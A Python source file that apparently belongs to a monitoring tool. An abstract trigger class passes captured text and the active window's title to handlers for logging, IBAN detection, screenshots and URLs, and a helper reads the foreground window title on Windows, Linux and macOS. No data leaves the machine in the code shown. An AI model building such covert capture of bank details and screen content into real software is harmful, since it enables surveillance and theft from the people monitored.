import platform
from abc import ABC, abstractmethod

from model.event_type import EventType
from strategies.handler.abstract_handle_strategy import AbstractStrategy
from strategies.handler.iban_strategy import IbanStrategy
from strategies.handler.log_strategy import LogStrategy
from strategies.handler.screenshot_strategy import ScreenshotStrategy
from strategies.handler.url_strategy import UrlStrategy


class AbstractTrigger(ABC):
    def __init__(self):
        self.strategies: list[AbstractStrategy] = [
            LogStrategy(),
            IbanStrategy(),
            ScreenshotStrategy(),
            UrlStrategy(),
        ]
        self.least_recently_text: str = ""
        self.least_recently_window: str = ""

    @abstractmethod
    def monitor(self) -> None:
        ...

    def callback(self, text: str, window_title: str, event_type: EventType) -> None:
        self.least_recently_text = text
        self.least_recently_window = window_title
        # 1. find all matching strategies
        matching_strategies: list[AbstractStrategy] = [x for x in self.strategies if x.can_handle(text, event_type)]

        # 2. handle no matching strategies
        if len(matching_strategies) == 0:
            return

        for strategy in matching_strategies:
            strategy.process_text(text, window_title, event_type)

    def _get_active_window_title(self) -> str:
        os_name = platform.system()

        if os_name == "Windows":
            try:
                import pygetwindow as gw
                return gw.getActiveWindow().title
            except ImportError:
                return "Please install the 'pygetwindow' module."

        elif os_name == "Linux":
            try:
                from ewmh import EWMH
                ewmh = EWMH()
                active_window = ewmh.getActiveWindow()
                return active_window.get_wm_name()
            except ImportError:
                return "Please install the 'python-ewmh' module."

        elif os_name == "Darwin":
            try:
                from AppKit import NSWorkspace
                return NSWorkspace.sharedWorkspace().activeApplication()['NSApplicationName']
            except ImportError:
                return "Please install the 'pyobjc' module."

        else:
            return f"Unsupported platform: {os_name}"
